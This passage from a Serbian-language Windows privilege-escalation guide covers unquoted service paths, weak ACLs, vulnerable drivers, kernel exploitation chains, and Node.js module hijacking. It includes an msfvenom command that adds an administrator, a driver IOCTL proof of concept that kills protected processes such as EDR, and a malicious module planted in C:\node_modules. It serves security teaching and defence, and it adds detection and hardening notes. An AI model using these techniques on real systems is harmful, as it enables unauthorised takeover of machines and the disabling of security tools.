Ako putanja do izvršne datoteke nije pod navodnicima, Windows će pokušati da izvrši svaku putanju koja se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Izlistajte sve Unquoted Service Paths, osim onih koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti** pomoću metasploit-a: `exploit/windows/local/trusted\_service\_path` Pomoću metasploit-a možete ručno da napravite binarnu datoteku servisa:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako usluga otkaže. Ova funkcija može da se konfiguriše tako da upućuje na binarnu datoteku. Ako je tu datoteku moguće zameniti, možda je moguća eskalacija privilegija. Više detalja potražite u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljne skripte zakazanih zadataka

Za omogućen zadatak koji pokreće `cmd.exe /c` sa datotekom `.bat` ili `.cmd`, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi za eksplicitni argument sa putanjom do datoteke u interpreteru, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovni poziv PowerShell-a sa `-File`, proverite i ACL te skripte; promenljive, uslovne naredbe i ulančavanje komandi u shell-u zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje predstavljaju mogućnost za izvršavanje između naloga samo kada se konfigurisani principal zadatka razlikuje od pozivaoca i kada zadatak zaista dođe do te radnje. ACL koji dozvoljava samo dodavanje sadržaja može biti važan za skripte, ali raniji `exit` ili drugi tok kontrole mogu učiniti dodate linije nedostižnim. Pre nego što tvrdite da je moguća eskalacija, potvrdite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i smernice za kontrolu aplikacija. Tokom popisivanja nemojte menjati skriptu niti pokretati zadatak.

## Imenovani tokovi u dostupnim datotekama

Na NTFS-u, čitljiva datoteka može da ima imenovani `:$DATA` tok čiji sadržaj nije prikazan u uobičajenom prikazu direktorijuma. Za mali, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, pregledajte **nazive i veličine** tokova pre otvaranja bilo kakvog sadržaja; Windows ih izlaže preko [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell preko [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Naziv toka koji nagoveštava da sadrži tajnu samo je trag. Proverite efektivna prava čitanja datoteke, podršku sistema datoteka za tokove, da li tok sadrži upotrebljive akreditive i na koji se nalog oni zaista autentifikuju. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom rutinskog popisivanja.

## Ulazi pomoćnog programa Windows Driver Kit-a koji pokreće zakazani zadatak

Opcioni Windows Driver Kit sadrži `StandaloneRunner.exe`, koji može da koristi datoteke `command.txt`, `reboot.rsf` i projektnu datoteku `working\rsf.rsf` iz svog direktorijuma za pokretanje. Zakazani zadatak ili usluga koji pokreću ovaj pomoćni program sa privilegovanim nalogom mogu pretvoriti pristup za upis sa niskim privilegijama u ove ulaze u izvršavanje komandi u kontekstu tog naloga, čak i kada je sama izvršna datoteka zaštićena. Potvrdite da postoji privilegovani proces koji ih koristi i da **obe** prateće datoteke mogu da se kreiraju ili menjaju; samo pronalaženje pomoćnog programa nije dovoljno.

Za zakazani zadatak proverite [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) njegove radnje i ACL-ove putanja do obe prateće datoteke. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke samo je trag koji treba proveriti, a ne dokaz lokacije sa koje zadatak čita ulaze. Mora biti ispunjen i preduslov u vezi sa projektnom radnom datotekom. Proverite stvarni principal zadatka umesto da pretpostavite da se izvršava kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku od njih i eskalirate privilegije) i **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent putanja za popravku

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Checkmk Windows agente koji su upisivali komandne fajlove u `C:\Windows\Temp`, a zatim izvršavali postojeći fajl zaštićen od upisa kada zamena ne bi uspela. Proizvođač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite punu instaliranu verziju zakrpe i da li se pogođena operacija agenta može pokrenuti; oznaka samo grane, poput `2.1`, ne može da utvrdi da li je sistem izložen. Enumeracija može da proveri verziju, stanje servisa i dozvole za Temp bez kreiranja fajlova ili pokretanja komandi agenta.

#### Provera SAML servisa ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) je uticao na ADSelfService Plus build 6210 i starije verzije; proizvođač je ispravio problem u buildu 6211. Relevantan je samo ako je SAML SSO **omogućen ili je ranije bio omogućen**. Zato je unos instaliranog proizvoda ili putanja servisa trag, a ne potvrda ranjivosti: proverite tačan build, istoriju SAML konfiguracije, dostupnost servisa preko mreže i nalog pod kojim se izvršava. Izvršavanje koda kroz servis nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva da se instanca pokreće kao SYSTEM. Čitljiv `OfflineBackup_*.ezip` u direktorijumu Backup proizvoda zaseban je trag o šifrovanoj rezervnoj kopiji, a ne dokaz da su akreditivi upotrebljivi ili da postoji ova SAML ranjivost. Tokom rutinske enumeracije zabeležite njegovu putanju i prava pristupa, bez raspakivanja.

#### Granice Jenkins kontrolera i domenskog naloga

Na Windows Jenkins kontroleru razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao zasebna prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu da pruže drugi način pokretanja builda, ali proverite da li su omogućeni i da li se build zaista izvršava. Izvršavanje se odvija pod identitetom kontrolera ili izabranog agenta, a sačuvani akreditivi mogu da se koriste samo ako posao ima pristup njihovom opsegu. Zasebno proverite pristup metapodacima u `JENKINS_HOME`: Jenkins čuva materijal za akreditive i ključeve za šifrovanje u `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkins skladištenje tajni](https://www.jenkins.io/doc/developer/security/secrets/)). Njihovo prisustvo samo po sebi ne otkriva lozinku; proverite **pristup za čitanje potrebnih fajlova** i zasebnu putanju za ponovnu upotrebu naloga, bez ispisivanja tajni u deljenom izlazu. Ako taj nalog ima pravo upisa u `scriptPath` AD korisničkog objekta, proverite da li je putanja skripte upisiva i da li postoji stvarni potrošač, kao što su prijava ili zakazani zadatak, koji se izvršava kao ciljni korisnik, pre nego što to smatrate izvršavanjem između korisnika. Svaka dodatna kontrola grupe zahteva zasebnu proveru efektivnih AD prava.

#### Identitet self-hosted agenta Azure Pipelines

Za Azure DevOps Server ili Azure Pipelines projekat razlikujte dozvolu za **kreiranje ili uređivanje** pipeline-a od dozvole za njegovo **stavljanje u red** i korišćenje izabranog pool-a agenata; [Microsoft zasebno dokumentuje dozvole za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autorizaciju pool-a](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ako nalog sa nižim privilegijama može da pošalje korak skripte i pokrene taj pipeline na self-hosted Windows agentu, korak se izvršava kao [konfigurisani nalog operativnog sistema agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Pre tvrdnje da je došlo do prelaska između korisnika ili do SYSTEM privilegija, proverite tačan pipeline, ograničenja grane/resursa, autorizovani pool, izvršiv posao i identitet servisnog naloga agenta. Instalirani agent, projektna uloga ili dozvola za upis u repozitorijum sami po sebi su samo trag; tokom pasivne enumeracije pregledajte dozvole i lokalne metapodatke servisa bez pokretanja builda.

#### Akreditivi za Microsoft Entra Connect Sync

[Microsoft razlikuje](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync servisni nalog**, koji pokreće servis za sinhronizaciju i pristupa njegovoj SQL bazi, od **AD DS konektorskog naloga**, čije dozvole u direktorijumu zavise od konfigurisanih funkcija sinhronizacije. Akreditivi konektora čuvaju se šifrovani u toj bazi, a ključni materijal je [zaštićen pomoću DPAPI-ja pod ADSync servisnim nalogom](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Instalirani servis za sinhronizaciju, grupa čiji naziv zvuči kao da ima lokalna administratorska prava ili sam pristup bazi ne potvrđuju da su akreditivi dešifrovi ili da postoji putanja za eskalaciju privilegija na domenu. Zasebno proverite stvarna prava čitanja baze, pristup servisnog naloga/ključevima, raspored instalacije i SQL-a, konfigurisani identitet konektora i efektivne AD privilegije tog identiteta. Rutinska enumeracija treba da prikaže samo metapodatke servisa i pristupa, a ne da ispituje ili ispisuje sačuvane tajne.

#### Dozvole za podršne DLL-ove drajvera štampača

Instalirani drajver štampača može da čuva podršne DLL-ove u `C:\ProgramData` i da ih učitava u privilegovanijem procesu za štampanje. Proverite ACL-ove tačnog direktorijuma drajvera i DLL-ova, uključujući nadređene direktorijume i tačke ponovne analize, čak i ako je enumeracija WMI-ja za štampače odbijena. Za [problem u drajveru štampača Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), navedena putanja bila je `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [prvobitno otkrivanje](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje učitavanje DLL-ova pomoću `PrintIsolationHost.exe`. ACL koji dozvoljava upis samo je trag: proverite efektivni pristup upisu nakon pravila deny, da li je relevantni drajver instaliran i učitava fajl pod privilegovanim identitetom, kao i da li su ažurirani drajver ili bezbednosni program proizvođača ispravili instalaciju. Nemojte zaključivati da postoji ranjivost samo na osnovu naziva direktorijuma ili verzije drajvera.

### Dozvole za upis

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali neku posebnu datoteku ili da li možete da izmenite binarnu datoteku koju će izvršiti administratorski nalog (schedtasks).

Slabe dozvole za direktorijume/datoteke u sistemu možete pronaći ovako:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ dodatak: postojanost/izvršavanje pri automatskom učitavanju

Notepad++ automatski učitava svaki DLL dodatka iz svojih podfoldera `plugins`. Ako postoji instalacija prenosive kopije sa dozvolom za upis, ubacivanje zlonamernog dodatka omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući izvršavanje iz `DllMain` i povratnih poziva dodatka).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri pokretanju sistema

**Proverite da li možete da prepišete neki ključ registratora ili binarnu datoteku koju će izvršiti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **autoruns lokacijama za eskalaciju privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **sumnjive/ranjive drajvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže primitivu za proizvoljno čitanje/pisanje kernela (često u loše projektovanim IOCTL handlerima), možete eskalirati privilegije tako što ćete direktno ukrasti SYSTEM token iz memorije kernela.<sup>[[13]](#references)</sup> Tehniku korak po korak pogledajte ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Povezani materijali o Windows kernel exploitation-u:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kod race-condition grešaka u kojima ranjivi poziv otvara Object Manager putanju koju kontroliše napadač, namerno usporavanje pretrage (pomoću komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može da produži vremenski prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF-ovi u cancel-safe queue-u, otkrivanje podataka iz paged pool-a i I/O ring pivot-i

Neki Windows kernel LPE lanci mogu se sastaviti od dve zasebno slabe greške: **race uslova u trajanju cancel-safe queue-a** koji oslobađa zahtev/CBD dok je zaključavanje queue-a i dalje aktivno i otkrivanja tipa **lock-release-before-copy** koje curi oslobođenu alokaciju iz paged pool-a tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Napomene o analizi i exploitation-u:

- **Oslobađanje memorije pod zaključavanjem + naknadni cancel**: potražite putanju uspeha koja radi **Acquire -> CompleteRequest/free -> Release**, dok putanja za cancel radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako putanja uspeha stigne do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre nego što otpusti CBDQ/CSQ lock, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije da nastavi i prosledi oslobođeni `PFLT_CALLBACK_DATA` nazad callback-u za uklanjanje u driver-u.
- **Ponovo iskoristite oslobođeni queue objekat** pomoću paged-pool alokacije iste veličine koju kontroliše napadač. `NPFS` Data Queue Entries su korisni jer se mogu kontrolisati sadržaj i veličina, a kasnije ih možete ispitati operacijama čitanja/peek-a nad pipe-om. Ako oslobođeni objekat sadrži linkove liste, prepišite ih **cikličnom listom lažnih request čvorova u korisničkoj memoriji**, tako da driver više puta obrađuje strukture zahteva koje definiše napadač, umesto da se zaustavi na početku originalne liste.
- **Unapredite predvidljivo upisivanje**: ako lažni request preusmeri ugnježdeni context pointer koji se koristi za upise pri vođenju evidencije (timestamps / QPC / polja uz refcount), možete dobiti upis u kernel memoriju sa **kontrolisanom adresom, ali nekontrolisanom vrednošću**. U tom slučaju ciljajte polje **length/size** objekta iz spray-a umesto završnog code/data pointer-a, pa prolazite kroz spray dok oštećeni objekat ne omogući **čitanje izvan granica paged pool-a**.
- **Obrazac otkrivanja podataka podložan race-u**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se povećava kada napadač može da uveća kopirani buffer (na primer, dodavanjem mnogih stavki liste/resursa koje povećavaju konačnu veličinu serializer alokacije), jer duže kopiranje produžava prozor za zamenu, a ne mora nužno da sruši mašinu.
- **Mete za dopunu bogate pointer-ima**: Windows **I/O ring** nizovi registrovanih buffera odlične su mete za otkrivanje podataka jer napadač kontroliše njihovu veličinu u paged pool-u (`8 * regBufferCnt`), a svaki element je kernel pointer ka `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, a zatim oštetite **`RegBuffers`** i **`RegBuffersCount`**, tako da naredne I/O ring operacije koriste unose koje je falsifikovao napadač i omoguće proizvoljno čitanje/pisanje kernela. Ako je jedini dostupan upis stabilan bajt (na primer, iz `KUSER_SHARED_DATA+0x14`), upotrebite **preklapajuće neporavnate upise** da biste sastavili korisnički pointer koji se ponavlja, kao što je `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i tamo postavite lažni niz registrovanih buffera.<sup>[[30]](#references)</sup>

Korisni pokazatelji za debagovanje:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada iz korumpiranog I/O ring-a dobijete proizvoljan kernel read/write, ukradite SYSTEM token standardnim post-primitive postupkom:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitivi za korupciju memorije košnice registra

Savremene ranjivosti košnica omogućavaju pripremu determinističkih rasporeda memorije, zloupotrebu upisivih potomaka HKLM/HKU i pretvaranje korupcije metapodataka u prekoračenja kernel paged pool-a bez prilagođenog drajvera. Ovde saznajte ceo lanac:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Zbrka tipova u direktnom režimu `RtlQueryRegistryValues` zbog putanja pod kontrolom napadača

Neki drajveri prihvataju putanju registra iz korisničkog prostora, proveravaju samo da li je to ispravan UTF-16 string, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i prosleđuju mu skalarni tip na steku, kao što je `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači prema **stvarnom** tipu registra, a ne prema tipu koji je programer očekivao.

Ovo daje dva korisna primitiva:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zbunjen posrednik / oracle**: putanja `\Registry\...` pod kontrolom korisnika omogućava drajveru da upituje ključeve koje je izabrao napadač, otkrije njihovo postojanje preko povratnih kodova/zapisa i ponekad pročita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Oštećenje kernel memorije**: odredište za skalar, kao što je `&readValue`, može biti pogrešno protumačeno kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa vrednosti registra.

Napomene za praktičnu eksploataciju:

- **Ublažavanje u Windows 8+**: ako upit pogodi **nepouzdanu košnicu** uz `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, pozivi iz kernela izazivaju pad sa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi ranjivost ostala iskoristiva, tražite **ključeve unutar pouzdanih sistemskih košnica u koje napadač može da upisuje**, umesto da postavljate vrednosti pod `HKCU`.
- **Priprema u pouzdanoj košnici**: koristite NtObjectManager da nabrojite upisive potomke `\Registry\Machine`, pa ponovo pokrenite skeniranje sa dupliranim tokenom **niskog integriteta** da biste pronašli ključeve dostupne iz sandbox-ovanih konteksta:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u `int` od 4 bajta oštećuje susedne podatke na steku i može delimično da prepiše obližnji callback/funkcijski pokazivač.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita `REG_DWORD` pod kontrolom napadača u skalarni podatak na steku, a zatim ponovo upotrebi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direktni režim tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi **negativnu** vrednost pod kontrolom napadača u ponovo upotrebljenom skalarnom podatku, sledeći upit `REG_BINARY` kopira bajtove napadača direktno preko susednih slotova na steku, što je često najjednostavniji način da se u potpunosti prepiše callback pokazivač.

Obrazac za traženje: **različiti tipovi čitanja registra u istu promenljivu na steku, bez njene ponovne inicijalizacije**. Pretražujte `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo korišćene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje registra određuje da li će se desiti drugo čitanje.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + gašenje EDR-a)

Neki potpisani drajveri trećih strana kreiraju objekat uređaja sa snažnim SDDL-om pomoću IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, bezbedni DACL se ne primenjuje kada se uređaju pristupa putem putanje koja sadrži dodatnu komponentu, pa bilo koji neprivilegovani korisnik može da dobije handle koristeći putanju imenskog prostora kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz slučaja iz stvarnog sveta)

Kada korisnik može da otvori uređaj, može da zloupotrebi privilegovane IOCTL-ove koje drajver izlaže za LPE i neovlašćene izmene. Primeri mogućnosti zabeleženih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell putem DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/upis sirovih podataka na disku (neovlašćene izmene van mreže, trikovi za postojanost pri pokretanju sistema).
- Gašenje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), što omogućava gašenje AV/EDR-a iz korisničkog prostora putem kernela.

Minimalni obrazac PoC-a (korisnički režim):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mere za ublažavanje rizika za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koje nameravate da ograničite pomoću DACL-a.
- Proveravajte kontekst pozivaoca pri privilegovanim operacijama. Dodajte PP/PPL provere pre nego što dozvolite prekidanje procesa ili vraćanje ručki.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite posredničke modele umesto direktnih privilegija kernela.

Ideje za detekciju za odbranu
- Nadgledajte otvaranja sumnjivih naziva uređaja iz korisničkog režima (npr. \\ .\\amsdk*) i specifične sekvence IOCTL-ova koje ukazuju na zloupotrebu.
- Sprovodite Microsoft-ovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/blokiranih elemenata.


## PATH DLL Hijacking

Ako imate **dozvole za upis u fasciklu koja se nalazi u PATH-u**, možda ćete moći da otmete DLL koji učitava proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle navedene u PATH-u:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking razrešavanja Node.js / Electron modula preko `C:\node_modules`

Ovo je varijanta **Windows uncontrolled search path** koja utiče na aplikacije **Node.js** i **Electron** kada koriste bare import kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

Node traži pakete tako što se penje kroz stablo direktorijuma i proverava fascikle `node_modules` u svakom nadređenom direktorijumu. U Windows-u, ovo traženje može da stigne do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može da proverava sledeće lokacije:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** pokuša da razreši nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, što predstavlja **LPE** ako se cilj izvršava kao administrator, iz zakazanog zadatka sa povišenim privilegijama / servisnog omotača ili iz automatski pokrenute privilegovane desktop aplikacije.

Ovo se naročito često dešava kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavija `require("foo")` u `try/catch` i nastavlja sa radom u slučaju greške
- je paket uklonjen iz produkcionih izdanja, izostavljen tokom pakovanja ili instalacija nije uspela
- se ranjivi `require()` nalazi duboko u stablu zavisnosti, a ne u glavnom kodu aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da potvrdite putanju razrešavanja:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = ciljna izvršna datoteka (`node.exe`, Electron EXE aplikacije ili proces omotača)
- Filtrirajte po `Path` koji `contains` `node_modules`
- Obratite pažnju na `NAME NOT FOUND` i poslednje uspešno otvaranje u okviru `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Eksploatacija

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregledom izvornog koda.
2. Kreirajte osnovni direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Postavite modul sa tačno očekivanim imenom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Primeri nedostajućih opcionih modula iz stvarnog sveta koji se uklapaju u ovaj obrazac uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo primeniti: pronađite bilo koji **nedostajući nepakovani import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i ojačavanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili tamo upisuje nove `.js` datoteke/pakete.
- Potražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji uključite sve runtime zavisnosti u paket i proverite upotrebu `optionalDependencies`.
- Pregledajte kod trećih strana i potražite obrasce koji ne prijavljuju greške, poput `try { require("...") } catch {}`.
- Onemogućite opcione provere ako ih biblioteka podržava (na primer, neka `ws` okruženja mogu da izbegnu zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts datoteka

Proverite da li su u hosts datoteci hardkodirani drugi poznati računari.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite spolja dostupnost **ograničenih servisa**.

```bash
netstat -ano #Opened ports?
```

